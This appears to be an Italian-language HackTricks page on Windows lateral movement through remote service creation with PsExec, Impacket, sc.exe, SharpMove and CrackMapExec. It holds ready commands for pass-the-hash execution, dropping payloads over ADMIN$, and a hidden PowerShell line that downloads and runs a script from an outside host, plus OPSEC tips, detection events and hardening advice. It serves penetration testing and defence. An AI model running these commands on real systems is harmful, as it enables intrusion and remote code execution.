# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Come funzionano

Queste tecniche abusano remotamente del Windows Service Control Manager (SCM) tramite SMB/RPC per eseguire comandi su un host target. Il flusso comune è:

1. Autenticarsi sul target e accedere alla share ADMIN$ tramite SMB (TCP/445).
2. Copiare un eseguibile o specificare una riga di comando LOLBAS da eseguire tramite il servizio.
3. Creare un servizio remoto tramite SCM (MS-SCMR su \PIPE\svcctl) che punti a quel comando o binario.
4. Avviare il servizio per eseguire il payload e, facoltativamente, acquisire stdin/stdout tramite una named pipe.
5. Arrestare il servizio ed effettuare la pulizia (eliminare il servizio e gli eventuali binari copiati).

Requisiti/prerequisiti:
- Amministratore locale sul target (SeCreateServicePrivilege) o diritti espliciti per creare servizi sul target.
- SMB (445) raggiungibile e share ADMIN$ disponibile; Remote Service Management consentito tramite il firewall dell'host.
- UAC Remote Restrictions: con account locali, il filtraggio dei token può bloccare l'accesso amministrativo tramite rete, a meno che non si usi l'account Administrator integrato o LocalAccountTokenFilterPolicy=1.
- Kerberos vs NTLM: l'uso di un hostname/FQDN abilita Kerberos; la connessione tramite IP spesso ricade su NTLM (che potrebbe essere bloccato in ambienti con configurazioni di sicurezza rafforzate).

### ScExec/WinExec manuale tramite sc.exe

Di seguito è mostrato un approccio minimo per la creazione di un servizio. L'immagine del servizio può essere un EXE copiato sul target o un LOLBAS come cmd.exe o powershell.exe.

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

Note:
- Aspettati un errore di timeout quando avvii un EXE non-service; l'esecuzione avviene comunque.
- Per essere più OPSEC-friendly, preferisci comandi fileless (cmd /c, powershell -enc) oppure elimina gli artefatti lasciati.

Trovi passaggi più dettagliati in: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Strumenti ed esempi

### Sysinternals PsExec.exe

- Classico strumento di amministrazione che usa SMB per copiare PSEXESVC.exe in ADMIN$, installa un servizio temporaneo (nome predefinito PSEXESVC) e inoltra l'I/O tramite named pipe.
- Esempi d'uso:<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- Puoi avviarlo direttamente da Sysinternals Live tramite WebDAV:

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- Lascia eventi di installazione/disinstallazione del servizio (il nome del servizio è spesso PSEXESVC, a meno che non venga usato -r) e crea C:\Windows\PSEXESVC.exe durante l’esecuzione.

### Impacket psexec.py (simile a PsExec)

- Usa un servizio simile a RemCom incorporato. Copia un binario di servizio temporaneo (spesso con nome randomizzato) tramite ADMIN$, crea un servizio (spesso RemComSvc per impostazione predefinita) e inoltra l’I/O tramite una named pipe.

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

Artefatti
- EXE temporaneo in C:\Windows\ (8 caratteri casuali). Il nome del servizio predefinito è RemComSvc, a meno che non venga sovrascritto.

### Impacket smbexec.py (SMBExec)

- Crea un servizio temporaneo che avvia cmd.exe e usa una named pipe per l'I/O. In genere evita di depositare un payload EXE completo; l'esecuzione dei comandi è semi-interattiva.

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implementa diversi metodi di lateral movement, incluso l'exec basato su servizi.

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- [SharpMove](https://github.com/0xthirteen/SharpMove) include la modifica/creazione di servizi per eseguire un comando da remoto.

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- Puoi anche usare CrackMapExec per eseguire tramite backend diversi (psexec/smbexec/wmiexec):

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

## OPSEC, rilevamento e artefatti

Artefatti tipici su host/rete quando si usano tecniche simili a PsExec:
- Eventi Security 4624 (Logon Type 3) e 4672 (Special Privileges) sul target per l'account admin utilizzato.
- Eventi Security 5140/5145 File Share e File Share Detailed che mostrano l'accesso ad ADMIN$ e la creazione/scrittura di binari di servizio (ad es. PSEXESVC.exe o un file .exe casuale di 8 caratteri).
- **System** 7045 da Service Control Manager per l'installazione del servizio sul target: nomi come PSEXESVC, RemComSvc o nomi personalizzati (`-r` / `-service-name`). Questo dimostra che è stato installato un servizio, non che la sua immagine sia stata eseguita. Quando disponibili, correla il timestamp e il percorso dell'immagine con gli eventi di processo o con una voce prefetch corrispondente all'immagine del servizio.<sup>[[4]](#references)</sup>
- Sysmon 1 (Process Create) per services.exe o l'immagine del servizio, 3 (Network Connect), 11 (File Create) in C:\Windows\, 17/18 (Pipe Created/Connected) per pipe come \\.\pipe\psexesvc, \\.\pipe\remcom_* o equivalenti randomizzati.
- Artefatto nel registro per l'EULA di Sysinternals: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 sull'host dell'operatore (se non soppresso).

Idee per la ricerca
- Genera un alert sulle installazioni di servizi il cui ImagePath include cmd.exe /c, powershell.exe o percorsi TEMP.
- Cerca creazioni di processi in cui ParentImage è C:\Windows\PSEXESVC.exe o processi figli di services.exe eseguiti come LOCAL SYSTEM che avviano shell.
- Segnala le named pipe che terminano con -stdin/-stdout/-stderr o che usano nomi di pipe noti dei cloni di PsExec.

## Risoluzione dei problemi comuni
- Access is denied (5) durante la creazione dei servizi: l'utente non è davvero admin locale, sono attive restrizioni UAC remote per gli account locali oppure la protezione antimanomissione EDR interviene sul percorso del binario del servizio.
- The network path was not found (53) o impossibile connettersi ad ADMIN$: firewall che blocca SMB/RPC o condivisioni amministrative disabilitate.
- Kerberos non funziona ma NTLM è bloccato: connettiti usando hostname/FQDN (non IP), assicurati che gli SPN siano corretti oppure, quando usi Impacket, fornisci `-k`/`-no-pass` con i ticket.
- Il timeout di avvio del servizio si verifica ma il payload è stato eseguito: è previsto se non si tratta di un vero binario di servizio; salva l'output in un file oppure usa smbexec per l'I/O in tempo reale.

## Note sul hardening
- Windows 11 24H2 e Windows Server 2025 richiedono SMB signing per impostazione predefinita per le connessioni in uscita (e in entrata in Windows 11). Ciò non impedisce l'uso legittimo di PsExec con credenziali valide, ma previene gli abusi di SMB relay senza firma e può avere un impatto sui dispositivi che non supportano la firma.<sup>[[2]](#references)</sup>
- Il nuovo blocco NTLM del client SMB (Windows 11 24H2/Server 2025) può impedire il fallback a NTLM quando ci si connette tramite IP o a server non Kerberos. Negli ambienti hardened questo impedirà l'uso di PsExec/SMBExec basati su NTLM; usa Kerberos (hostname/FQDN) o configura eccezioni se necessario per motivi legittimi.<sup>[[2]](#references)</sup>
- Principio del privilegio minimo: riduci al minimo l'appartenenza al gruppo admin locale, preferisci Just-in-Time/Just-Enough Admin, applica LAPS e monitora/genera alert sulle installazioni di servizi 7045.

## Vedi anche

- Esecuzione remota basata su WMI (spesso più fileless):

{{#ref}}
./wmiexec.md
{{#endref}}

- Esecuzione remota basata su WinRM:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [Hardening della sicurezza SMB in Windows Server 2025 e Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Usare le credenziali per compromettere i sistemi Windows - Parte 2 (PSExec e servizi)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft – Risolvere i riavvii imprevisti usando i log eventi di sistema](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
{{#include ../../banners/hacktricks-training.md}}
